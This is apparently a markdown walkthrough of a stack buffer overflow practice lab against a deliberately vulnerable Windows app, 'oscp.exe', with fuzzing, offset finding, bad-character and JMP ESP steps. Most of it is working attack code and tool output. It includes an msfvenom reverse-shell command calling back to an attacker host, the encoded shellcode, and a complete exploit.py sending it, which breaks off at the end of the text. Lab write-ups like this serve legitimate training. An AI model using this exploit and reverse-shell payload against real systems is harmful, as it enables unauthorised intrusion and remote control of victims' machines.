# Buffer Overflow Prep (Task 1)
## Table of Contents
* [Prerequisites](#prerequisites)
* [Getting Started](#getting-started)
* [Fuzz the App](#fuzz-the-app)
* [Find the EIP Register](#find-the-eip-register)
* [Identify Bad Characters](#identify-bad-characters)
  * [Repeat Me](#repeat-me)
  * [Gotchas](#gotchas)
* [Find a JMP Instruction](#find-a-jmp-instruction)
* [Generate a Payload](#generate-a-payload)
* [Send the Exploit](#send-the-exploit)

## Prerequisites
| Python Script | Purpose |
| ------ | ------- |
| [fuzzer.py](#fuzzerpy) | Identifies how many bytes are required to crash the app. |
| [bytearray.py](#bytearraypy) | Generates all possible hexadecimal characters. |
| [exploit.py](#exploitpy) | Sends the selected payload to the app. |

#### fuzzer.py
```python
#!/usr/bin/env python3

import socket
import time

IP = "10.10.10.23" # change me
PORT = 1337 # change me
PREFIX = "OVERFLOW1 " # change me
OFFSET = 1600 
FUZZ = PREFIX + "A" * OFFSET
TARGET = (IP,PORT)

print("[*] Fuzzing: %s" % IP)
while True:
    try:
        CLIENT = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        CLIENT.settimeout(3)
        CLIENT.connect(TARGET)
        CLIENT.send(FUZZ)
        CLIENT.recv(1024)
        CLIENT.close()
        FUZZ_LENGTH = len(FUZZ) - len(PREFIX)
        print("[+] Sent: %d bytes" % FUZZ_LENGTH)
    except socket.error as ERROR:
        print("[!] Failed to connect.")
        exit()
    FUZZ += "A" * 100
    time.sleep(1)
```

#### bytearray.py
```python
#!/usr/bin/env python3

ARRAY = []
for x in range(1, 256):
    BYTE = ("\\x" + "{:02x}".format(x))
    ARRAY += BYTE
BYTEARRAY = ''.join(ARRAY)
print(BYTEARRAY)
```

#### exploit.py
```python
#!/usr/bin/env python3

import socket

IP = "10.10.10.13" # change me
PORT = 1337 # change me
TARGET = (IP,PORT)
PREFIX = "OVERFLOW1 " # change me; vulnerable function of target
OFFSET = 0 # change me; fuzz the target to determine the correct value
OVERFLOW = "A" * OFFSET # bogus chars that will preceed the 
RETN = "" # address of a JMP instruction, in Little Endian
PADDING = "" # so the MSFvenom encoder does not overwrite itself
BADCHARS = "" # exclude these from your shellcode
PAYLOAD = "" # your shellcode, probably a reverse shell
SUFFIX = "" 
EXPLOIT = PREFIX + OVERFLOW + RETN + PADDING + PAYLOAD + SUFFIX

print("[*] Attacking: %s" % IP)
try:
    CLIENT = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    CLIENT.settimeout(3)
    CLIENT.connect(TARGET)
    CLIENT.send(EXPLOIT)
    CLIENT.recv(1024)
    CLIENT.close()
    print("[+] Sent exploit.")
except socket.error as ERROR:
    print("[!] Failed to connect.")
    exit()
```

## Getting Started
*Login to the target, start the app, configure a working folder, and connect to the app.*

Login to the target via RDP using xfreerdp. 
```bash
xfreerdp /u:admin /p:password /cert:ignore /v:10.10.10.23 /workarea
```

Right-click on Immunity Debugger and select "Run as administrator." Then, open and start the app by selecting Debug > Run. The app of interested is called "oscp.exe" and located here: ~/Desktop/vulnerable/apps/oscp/

Enter the sentence below into the Command Bar of Immunity to configure a working folder. 
```bash
!mona config -set workingfolder c:\mona\%p

# output
0BADF00D   [+] Command used:
0BADF00D   !mona config -set workingfolder c:\mona\%p
0BADF00D   Writing value to configuration file
0BADF00D   Old value of parameter workingfolder =
0BADF00D   [+] Creating config file, setting parameter workingfolder
0BADF00D   New value of parameter workingfolder =  c:\mona\%p
0BADF00D
0BADF00D   [+] This mona.py action took 0:00:00
```

Connect to the app using Netcat.
```bash
nc 10.10.10.23 1337
HELP # then, ctrl + c

# output
Welcome to OSCP Vulnerable Server! Enter HELP for help.
Valid Commands:
HELP
OVERFLOW1 [value]
OVERFLOW2 [value]
OVERFLOW3 [value]
OVERFLOW4 [value]
OVERFLOW5 [value]
OVERFLOW6 [value]
OVERFLOW7 [value]
OVERFLOW8 [value]
OVERFLOW9 [value]
OVERFLOW10 [value]
EXIT
```

## Fuzz the App
*Edit and run fuzzer.py.*

Configure the correct IP address in the "fuzzer.py" Python script and then, run it. Make a note of how many bytes were sent. For example, the output below shows 2000 bytes were sent before the app crashed. 
```bash
python fuzzer.py

# output
[*] Fuzzing: 10.10.10.23
[+] Sent: 1600 bytes
[+] Sent: 1700 bytes
[+] Sent: 1800 bytes
[+] Sent: 1900 bytes
[+] Sent: 2000 bytes
[!] Failed to connect.
```

## Find the EIP Register
*Generate a Metasploit Pattern, add it to exploit.py, run exploit.py, find the offset, edit exploit.py, and run it again.*

Generate a Metasploit Pattern using the command below. Set the length to be the same number of bytes that caused the app to crash PLUS 400 additional bytes. 
```bash
msf-pattern_create -l 2400 # 2000 bytes crashed the app + 400 more bytes

# output
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9Cs0Cs1Cs2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9Cu0Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2Cv3Cv4Cv5Cv6Cv7Cv8Cv9Cw0Cw1Cw2Cw3Cw4Cw5Cw6Cw7Cw8Cw9Cx0Cx1Cx2Cx3Cx4Cx5Cx6Cx7Cx8Cx9Cy0Cy1Cy2Cy3Cy4Cy5Cy6Cy7Cy8Cy9Cz0Cz1Cz2Cz3Cz4Cz5Cz6Cz7Cz8Cz9Da0Da1Da2Da3Da4Da5Da6Da7Da8Da9Db0Db1Db2Db3Db4Db5Db6Db7Db8Db9
```

Copy/paste the output from above into the PAYLOAD variable of the "exploit.py" Python script. Ensure OFFSET is set to 0. Then, run the "exploit.py" Python script. 
```bash
vim exploit.py # edit the PAYLOAD and OFFSET variables
python exploit.py

# output
[*] Attacking: 10.10.10.23
[+] Sent exploit.
```

Input the sentence below into the Command Bar of Immunity Debugger. Look for a line that says "EIP contains..." within the "[+] Examining registers" section. FYI, findmsp "finds Metasploit Patterns" (a.k.a "cyclic patterns"). The distance option can set to before or after the ESP register. For example, the sentence below will search for a Metasploit Pattern 2400 bytes before the ESP register. 
```bash
!mona findmsp -distance 2400

# output
0BADF00D   [+] Command used:
0BADF00D   !mona findmsp -distance 2400
0BADF00D   [+] Looking for cyclic pattern in memory
74940000   Modules C:\Windows\System32\wshtcpip.dll
0BADF00D       Cyclic pattern (normal) found at 0x018af272 (length 2400 bytes)
0BADF00D       Cyclic pattern (normal) found at 0x003e394a (length 2400 bytes)
0BADF00D       Cyclic pattern (normal) found at 0x003e4d7a (length 2400 bytes)
0BADF00D   [+] Examining registers
0BADF00D       EIP contains normal pattern : 0x6f43396e (offset 1978) # <--- LOOK FOR A LINE LIKE THIS
0BADF00D       ESP (0x018afa30) points at offset 1982 in normal pattern (length 418)
0BADF00D       EBP contains normal pattern : 0x43386e43 (offset 1974)
0BADF00D       EBX contains normal pattern : 0x376e4336 (offset 1970)
0BADF00D   [+] Examining SEH chain
0BADF00D   [+] Examining stack (+- 2400 bytes) - looking for cyclic pattern
0BADF00D       Walking stack from 0x018af0d0 to 0x018b0394 (0x000012c4 bytes)
0BADF00D       0x018af274 : Contains normal cyclic pattern at ESP-0x7bc (-1980) : offset 2, length 2398 (-> 0x018afbd1 : ESP+0x1a2)
0BADF00D   [+] Examining stack (+- 2400 bytes) - looking for pointers to cyclic pattern
0BADF00D       Walking stack from 0x018af0d0 to 0x018b0394 (0x000012c4 bytes)
0BADF00D       0x018af168 : Pointer into normal cyclic pattern at ESP-0x8c8 (-2248) : 0x018af7a0 : offset 1326, length 1074
0BADF00D   [+] Preparing output file 'findmsp.txt'
0BADF00D       - (Re)setting logfile findmsp.txt
0BADF00D   [+] Generating module info table, hang on...
0BADF00D       - Processing modules
0BADF00D       - Done. Let's rock 'n roll.
0BADF00D
0BADF00D   [+] This mona.py action took 0:00:06.958000
```

Use the offset value to fill the OFFSET variable within the "exploit.py" Python script. Also, put "BBBB" in the RETN variable (in order to confirm the location of the EIP register). Make sure to reload and restart the app before running "exploit.py" again. 

## Identify Bad Characters
*Generate byte arrays,*

Generate a byte array using Immunity Debugger and the sentence below. Make sure to exclude the "null byte" or "\x00". 
```bash
!mona bytearray -b "\x00"

# output
0BADF00D   [+] Command used:
0BADF00D   !mona bytearray -b "\x00"
0BADF00D    *** Note: parameter -b has been deprecated and replaced with -cpb ***
0BADF00D   Generating table, excluding 1 bad chars...
0BADF00D   Dumping table to file
0BADF00D   [+] Preparing output file 'bytearray.txt'
0BADF00D       - Creating working folder c:\mona\oscp
0BADF00D       - Folder created
0BADF00D       - (Re)setting logfile c:\mona\oscp\bytearray.txt
"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
0BADF00D
0BADF00D   Done, wrote 255 bytes to file c:\mona\oscp\bytearray.txt
0BADF00D   Binary output saved in c:\mona\oscp\bytearray.bin
0BADF00D
0BADF00D   [+] This mona.py action took 0:00:00.031000
```

Generate a second byte array on your attack machine using the "bytearray.py" Python script. 
```bash
python bytearray.py

# output
\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff
```

Copy/paste the output above into the PAYLOAD variable of the "exploit.py" Python script. Then, run "exploit.py." 

### Repeat Me
Using Immunity Debugger, copy the address of the ESP register and use it in the sentence below. The resulting output will indicate which characters (sent by "exploit.py") need to be removed from the PAYLOAD variable. 
```bash
!mona compare -f C:\mona\oscp\bytearray.bin -a 0186FA30

# output
Address                    Status                     BadChars                   Type                       Location
0x0184fa30                 Corruption after 6 bytes   00 07 08 2e 2f a0 a1       normal                     Stack
```

Remove a bad character (left-to-right) from the PAYLOAD variable, reload/restart the app, and create a new byte array on the target (there is no need to create a new byte array locally at this point; your focus is the current PAYLOAD variable and the target). Then, run the "exploit.py" Python script to crash the app again. 
```bash
!mona bytearray -b "\x00\x07" # notice x07 is now being excluded too
```

Repeat this process (the steps between [Repeat Me](#repeat-me) and this paragraph) until all bad characters have been identified. For example, the sentences below (1) generates a new byte array excluding all bad characters for this challenge and then (2) compares it to the current address in the ESP register. 
```bash
!mona bytearray -b "\x00\x07\x2e\xa0"
!mona compare -f C:\mona\oscp\bytearray.bin -a 0186FA30

# output
mona Memory comparison results
Address                    Status                     BadChars                   Type                       Location
0x0190fa30                 Unmodified                                            normal                     Stack
```

### Gotchas
* Generate a new byte array every time you're excluding a new bad character.
* Copy/paste the address in the ESP register every time - it changes!
* Beware of how you are sending data to the app - send exactly what is generated by the "bytearray.py" Python script. I had issues before when I attempted to convert and encode it. 

## Find a JMP Instruction
*Find a JMP instruction and edit exploit.py.*

Use the sentence below to find a JMP instruction while excluding specific characters. 
```bash
!mona jmp -r esp -cpb "\x00\x07\x2e\xa0"

# output
0BADF00D   [+] Command used:
0BADF00D   !mona jmp -r esp -cpb "\x00\x07\x2e\xa0"
0BADF00D   [+] Processing arguments and criteria
0BADF00D       - Pointer access level : X
0BADF00D       - Bad char filter will be applied to pointers : "\x00\x07\x2e\xa0"
0BADF00D   [+] Generating module info table, hang on...
0BADF00D       - Processing modules
0BADF00D       - Done. Let's rock 'n roll.
0BADF00D   [+] Querying 2 modules
0BADF00D       - Querying module essfunc.dll
0BADF00D       - Querying module oscp.exe
0BADF00D       - Search complete, processing results
0BADF00D   [+] Preparing output file 'jmp.txt'
0BADF00D       - (Re)setting logfile c:\mona\oscp\jmp.txt
0BADF00D   [+] Writing results to c:\mona\oscp\jmp.txt
0BADF00D       - Number of pointers of type 'jmp esp' : 9
0BADF00D   [+] Results :
625011AF     0x625011af : jmp esp |  {PAGE_EXECUTE_READ} [essfunc.dll] # <--- USING THIS ONE
625011BB     0x625011bb : jmp esp |  {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False...
625011C7     0x625011c7 : jmp esp |  {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False...
625011D3     0x625011d3 : jmp esp |  {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False...
625011DF     0x625011df : jmp esp |  {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False...
625011EB     0x625011eb : jmp esp |  {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False...
625011F7     0x625011f7 : jmp esp |  {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False...
62501203     0x62501203 : jmp esp | ascii {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False...
62501205     0x62501205 : jmp esp | ascii {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False...
0BADF00D       Found a total of 9 pointers
0BADF00D
0BADF00D   [+] This mona.py action took 0:00:00.359000
```

Once you find a JMP instruction, update the RETN variable within the "exploit.py" Python script. Make sure you put it "backwards" to reflect Little Endian memory addressing. For example, even though the address I used was "\x62\x50\x11\xaf", I typed it like this "\xaf\x11\x50\x62".
```python
RETN = "\xaf\x11\x50\x62" # address of JMP instruction, in Little Endian
```

## Generate a Payload
*Generate a payload using MSFvenom and edit exploit.py.*

Use MSFvenom to generate a Reverse Shell payload.  
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.69 LPORT=443 -f python -v PAYLOAD EXITFUNC=thread -b "\x00\x07\x2e\xa0"

# output
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
Found 11 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 351 (iteration=0)
x86/shikata_ga_nai chosen with final size 351
Payload size: 351 bytes
Final size of python file: 1869 bytes
PAYLOAD =  b""
PAYLOAD += b"\xdb\xd7\xb8\xbe\x70\x8f\x39\xd9\x74\x24\xf4\x5b"
PAYLOAD += b"\x31\xc9\xb1\x52\x31\x43\x17\x03\x43\x17\x83\x7d"
PAYLOAD += b"\x74\x6d\xcc\x7d\x9d\xf3\x2f\x7d\x5e\x94\xa6\x98"
PAYLOAD += b"\x6f\x94\xdd\xe9\xc0\x24\x95\xbf\xec\xcf\xfb\x2b"
PAYLOAD += b"\x66\xbd\xd3\x5c\xcf\x08\x02\x53\xd0\x21\x76\xf2"
PAYLOAD += b"\x52\x38\xab\xd4\x6b\xf3\xbe\x15\xab\xee\x33\x47"
PAYLOAD += b"\x64\x64\xe1\x77\x01\x30\x3a\xfc\x59\xd4\x3a\xe1"
PAYLOAD += b"\x2a\xd7\x6b\xb4\x21\x8e\xab\x37\xe5\xba\xe5\x2f"
PAYLOAD += b"\xea\x87\xbc\xc4\xd8\x7c\x3f\x0c\x11\x7c\xec\x71"
PAYLOAD += b"\x9d\x8f\xec\xb6\x1a\x70\x9b\xce\x58\x0d\x9c\x15"
PAYLOAD += b"\x22\xc9\x29\x8d\x84\x9a\x8a\x69\x34\x4e\x4c\xfa"
PAYLOAD += b"\x3a\x3b\x1a\xa4\x5e\xba\xcf\xdf\x5b\x37\xee\x0f"
PAYLOAD += b"\xea\x03\xd5\x8b\xb6\xd0\x74\x8a\x12\xb6\x89\xcc"
PAYLOAD += b"\xfc\x67\x2c\x87\x11\x73\x5d\xca\x7d\xb0\x6c\xf4"
PAYLOAD += b"\x7d\xde\xe7\x87\x4f\x41\x5c\x0f\xfc\x0a\x7a\xc8"
PAYLOAD += b"\x03\x21\x3a\x46\xfa\xca\x3b\x4f\x39\x9e\x6b\xe7"
PAYLOAD += b"\xe8\x9f\xe7\xf7\x15\x4a\xa7\xa7\xb9\x25\x08\x17"
PAYLOAD += b"\x7a\x96\xe0\x7d\x75\xc9\x11\x7e\x5f\x62\xbb\x85"
PAYLOAD += b"\x08\x87\x34\x65\x79\xff\x46\x65\x7b\xbb\xce\x83"
PAYLOAD += b"\x11\xab\x86\x1c\x8e\x52\x83\xd6\x2f\x9a\x19\x93"
PAYLOAD += b"\x70\x10\xae\x64\x3e\xd1\xdb\x76\xd7\x11\x96\x24"
PAYLOAD += b"\x7e\x2d\x0c\x40\x1c\xbc\xcb\x90\x6b\xdd\x43\xc7"
PAYLOAD += b"\x3c\x13\x9a\x8d\xd0\x0a\x34\xb3\x28\xca\x7f\x77"
PAYLOAD += b"\xf7\x2f\x81\x76\x7a\x0b\xa5\x68\x42\x94\xe1\xdc"
PAYLOAD += b"\x1a\xc3\xbf\x8a\xdc\xbd\x71\x64\xb7\x12\xd8\xe0"
PAYLOAD += b"\x4e\x59\xdb\x76\x4f\xb4\xad\x96\xfe\x61\xe8\xa9"
PAYLOAD += b"\xcf\xe5\xfc\xd2\x2d\x96\x03\x09\xf6\xb6\xe1\x9b"
PAYLOAD += b"\x03\x5f\xbc\x4e\xae\x02\x3f\xa5\xed\x3a\xbc\x4f"
PAYLOAD += b"\x8e\xb8\xdc\x3a\x8b\x85\x5a\xd7\xe1\x96\x0e\xd7"
PAYLOAD += b"\x56\x96\x1a"
```

Replace the current value in the PAYLOAD variable of the "exploit.py" Python script with the output above. Make sure to also add or update the PADDING variable so it matches the assignment below. This variable is necessary so the encoder included by MSFVenom does not overwrite itself. 
```python
PADDING = "\x90" * 16
``` 

## Send the Exploit
*Run exploit.py.*

Run the "exploit.py" Python script below to exploit the app and attack the target.
```python
#!/usr/bin/env python3

import socket

IP = "10.10.10.23" # change me
PORT = 1337 # change me
TARGET = (IP,PORT)
PREFIX = "OVERFLOW1 " # change me
OFFSET = 1978
OVERFLOW = "A" * OFFSET
RETN = "\xaf\x11\x50\x62" # address of JMP instruction, in Little Endian
PADDING = "\x90" * 16
PAYLOAD =  b""
PAYLOAD += b"\xdb\xd7\xb8\xbe\x70\x8f\x39\xd9\x74\x24\xf4\x5b"
PAYLOAD += b"\x31\xc9\xb1\x52\x31\x43\x17\x03\x43\x17\x83\x7d"
PAYLOAD += b"\x74\x6d\xcc\x7d\x9d\xf3\x2f\x7d\x5e\x94\xa6\x98"
PAYLOAD += b"\x6f\x94\xdd\xe9\xc0\x24\x95\xbf\xec\xcf\xfb\x2b"
PAYLOAD += b"\x66\xbd\xd3\x5c\xcf\x08\x02\x53\xd0\x21\x76\xf2"
PAYLOAD += b"\x52\x38\xab\xd4\x6b\xf3\xbe\x15\xab\xee\x33\x47"
PAYLOAD += b"\x64\x64\xe1\x77\x01\x30\x3a\xfc\x59\xd4\x3a\xe1"
PAYLOAD += b"\x2a\xd7\x6b\xb4\x21\x8e\xab\x37\xe5\xba\xe5\x2f"
PAYLOAD += b"\xea\x87\xbc\xc4\xd8\x7c\x3f\x0c\x11\x7c\xec\x71"
PAYLOAD += b"\x9d\x8f\xec\xb6\x1a\x70\x9b\xce\x58\x0d\x9c\x15"
PAYLOAD += b"\x22\xc9\x29\x8d\x84\x9a\x8a\x69\x34\x4e\x4c\xfa"
PAYLOAD += b"\x3a\x3b\x1a\xa4\x5e\xba\xcf\xdf\x5b\x37\xee\x0f"
PAYLOAD += b"\xea\x03\xd5\x8b\xb6\xd0\x74\x8a\x12\xb6\x89\xcc"
PAYLOAD += b"\xfc\x67\x2c\x87\x11\x73\x5d\xca\x7d\xb0\x6c\xf4"
PAYLOAD += b"\x7d\xde\xe7\x87\x4f\x41\x5c\x0f\xfc\x0a\x7a\xc8"
PAYLOAD += b"\x03\x21\x3a\x46\xfa\xca\x3b\x4f\x39\x9e\x6b\xe7"
PAYLOAD += b"\xe8\x9f\xe7\xf7\x15\x4a\xa7\xa7\xb9\x25\x08\x17"
PAYLOAD += b"\x7a\x96\xe0\x7d\x75\xc9\x11\x7e\x5f\x62\xbb\x85"
PAYLOAD += b"\x08\x87\x34\x65\x79\xff\x46\x65\x7b\xbb\xce\x83"
PAYLOAD += b"\x11\xab\x86\x1c\x8e\x52\x83\xd6\x2f\x9a\x19\x93"
PAYLOAD += b"\x70\x10\xae\x64\x3e\xd1\xdb\x76\xd7\x11\x96\x24"
PAYLOAD += b"\x7e\x2d\x0c\x40\x1c\xbc\xcb\x90\x6b\xdd\x43\xc7"
PAYLOAD += b"\x3c\x13\x9a\x8d\xd0\x0a\x34\xb3\x28\xca\x7f\x77"
PAYLOAD += b"\xf7\x2f\x81\x76\x7a\x0b\xa5\x68\x42\x94\xe1\xdc"
PAYLOAD += b"\x1a\xc3\xbf\x8a\xdc\xbd\x71\x64\xb7\x12\xd8\xe0"
PAYLOAD += b"\x4e\x59\xdb\x76\x4f\xb4\xad\x96\xfe\x61\xe8\xa9"
PAYLOAD += b"\xcf\xe5\xfc\xd2\x2d\x96\x03\x09\xf6\xb6\xe1\x9b"
PAYLOAD += b"\x03\x5f\xbc\x4e\xae\x02\x3f\xa5\xed\x3a\xbc\x4f"
PAYLOAD += b"\x8e\xb8\xdc\x3a\x8b\x85\x5a\xd7\xe1\x96\x0e\xd7"
PAYLOAD += b"\x56\x96\x1a"
BADCHARS = "\x00\x07\x2e\xa0"
SUFFIX = ""
EXPLOIT = PREFIX + OVERFLOW + RETN + PADDING + PAYLOAD + SUFFIX

print("[*] Attacking: %s" % IP)
try:
    CLIENT = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    CLIENT.settimeout(3)
    CLIENT.connect(TARGET)
    CLIENT.send(EXPLOIT)
    CLIENT.recv(1024)
    CLIENT.close()
    print("[+] Sent exploit.")
except socket.error as ERROR:
